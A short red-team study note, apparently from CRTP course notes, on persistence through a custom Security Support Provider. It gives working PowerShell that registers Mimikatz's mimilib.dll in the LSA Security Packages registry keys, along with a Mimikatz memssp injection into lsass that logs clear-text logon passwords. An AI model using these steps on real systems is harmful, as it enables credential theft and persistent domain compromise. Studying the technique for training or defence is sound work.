# Persistence – Custom SSP
- A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are
  - NTLM
  - Kerberos
  - Wdigest
  - CredSSP
- Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
- Drop the mimilib.dll to system32 and add mimilib to ```HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages```:
```
$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages
```
- Using mimikatz, inject into lsass (Not stable with Server 2016 and Server 2019): <br>
``` Invoke-Mimikatz -Command '"misc::memssp"' ```
- All local logons on the DC are logged to ```C:\Windows\system32\kiwissp.log```:
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/54d7da1b-4b28-4fbe-aae1-ff414bbf168d)
